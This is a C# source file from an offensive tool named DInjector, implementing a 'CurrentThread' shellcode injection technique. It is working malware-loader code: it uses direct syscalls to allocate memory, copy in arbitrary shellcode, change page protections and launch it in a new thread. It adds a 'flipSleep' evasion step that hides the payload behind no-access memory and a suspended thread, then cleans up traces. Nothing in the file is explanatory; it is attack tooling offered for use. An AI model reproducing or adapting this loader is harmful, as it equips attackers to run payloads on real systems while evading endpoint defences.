using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class CurrentThread
    {
        public static void Execute(byte[] shellcode, uint protect, uint timeout, int flipSleep)
        {
            uint allocProtect = 0, newProtect = 0;
            string strAllocProtect = "", strNewProtect = "";
            if (protect == DI.Data.Win32.WinNT.PAGE_EXECUTE_READ)
            {
                allocProtect = DI.Data.Win32.WinNT.PAGE_READWRITE;
                strAllocProtect = "PAGE_READWRITE";
                newProtect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READ;
                strNewProtect = "PAGE_EXECUTE_READ";
            }
            else if (protect == DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE)
            {
                allocProtect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
                strAllocProtect = "PAGE_EXECUTE_READWRITE";
            }

            bool suspended = false;
            if (flipSleep > 0)
            {
                allocProtect = DI.Data.Win32.WinNT.PAGE_READWRITE;
                strAllocProtect = "PAGE_READWRITE";
                newProtect = DI.Data.Win32.WinNT.PAGE_NOACCESS;
                strNewProtect = "PAGE_NOACCESS";
                suspended = true;
            }

            #region NtAllocateVirtualMemory (allocProtect)

            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                allocProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine($"(CurrentThread) [+] NtAllocateVirtualMemory, {strAllocProtect}");
            else
                throw new Exception($"(CurrentThread) [-] NtAllocateVirtualMemory, {strAllocProtect}: {ntstatus}");

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #endregion

            IntPtr protectAddress;
            uint oldProtect = 0;
            if (newProtect > 0)
            {
                #region NtProtectVirtualMemory (newProtect)

                protectAddress = baseAddress;
                regionSize = (IntPtr)shellcode.Length;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    hProcess,
                    ref protectAddress,
                    ref regionSize,
                    newProtect,
                    ref oldProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine($"(CurrentThread) [+] NtProtectVirtualMemory, {strNewProtect}");
                else
                    throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, {strNewProtect}: {ntstatus}");

                #endregion
            }

            #region NtCreateThreadEx

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                baseAddress,
                IntPtr.Zero,
                suspended,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtCreateThreadEx");
            else
                throw new Exception($"(CurrentThread) [-] NtCreateThreadEx: {ntstatus}");

            #endregion

            if (flipSleep > 0)
            {
                Console.WriteLine($"(CurrentThread) [=] Sleeping for {flipSleep} ms ...");

                System.Threading.Thread.Sleep(flipSleep);

                #region NtProtectVirtualMemory (protect)

                protectAddress = baseAddress;
                regionSize = (IntPtr)shellcode.Length;
                oldProtect = 0;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    hProcess,
                    ref protectAddress,
                    ref regionSize,
                    protect,
                    ref oldProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, protect");
                else
                    throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, protect: {ntstatus}");

                #endregion

                #region NtResumeThread

                uint suspendCount = 0;

                ntstatus = Syscalls.NtResumeThread(
                    hThread,
                    ref suspendCount);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread) [+] NtResumeThread");
                else
                    throw new Exception($"(CurrentThread) [-] NtResumeThread: {ntstatus}");

                #endregion
            }

            if (timeout > 0) // if the shellcode does not need to serve forever, we can do the clean up
            {
                _ = Win32.WaitForSingleObject(hThread, timeout);

                if (oldProtect > 0)
                {
                    #region CleanUp: NtProtectVirtualMemory (PAGE_READWRITE)

                    protectAddress = baseAddress;
                    regionSize = (IntPtr)shellcode.Length;
                    uint tmpProtect = 0;

                    ntstatus = Syscalls.NtProtectVirtualMemory(
                        hProcess,
                        ref protectAddress,
                        ref regionSize,
                        DI.Data.Win32.WinNT.PAGE_READWRITE,
                        ref tmpProtect);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine("(CurrentThread.CleanUp) [+] NtProtectVirtualMemory, PAGE_READWRITE");
                    else
                        throw new Exception($"(CurrentThread.CleanUp) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

                    #endregion
                }

                // Zero out shellcode bytes
                Marshal.Copy(new byte[shellcode.Length], 0, baseAddress, shellcode.Length);

                #region CleanUp: NtFreeVirtualMemory (shellcode)

                regionSize = (IntPtr)shellcode.Length;

                ntstatus = Syscalls.NtFreeVirtualMemory(
                    hProcess,
                    ref baseAddress,
                    ref regionSize,
                    DI.Data.Win32.Kernel32.MEM_RELEASE);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread.CleanUp) [+] NtFreeVirtualMemory, shellcode");
                else
                    throw new Exception($"(CurrentThread.CleanUp) [-] NtFreeVirtualMemory, shellcode: {ntstatus}");

                #endregion
            }

            #region NtWaitForSingleObject

            ntstatus = Syscalls.NtWaitForSingleObject(
                hThread,
                false,
                0);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject");
            else
                throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject: {ntstatus}");

            #endregion

            Syscalls.NtClose(hThread);
        }
    }
}
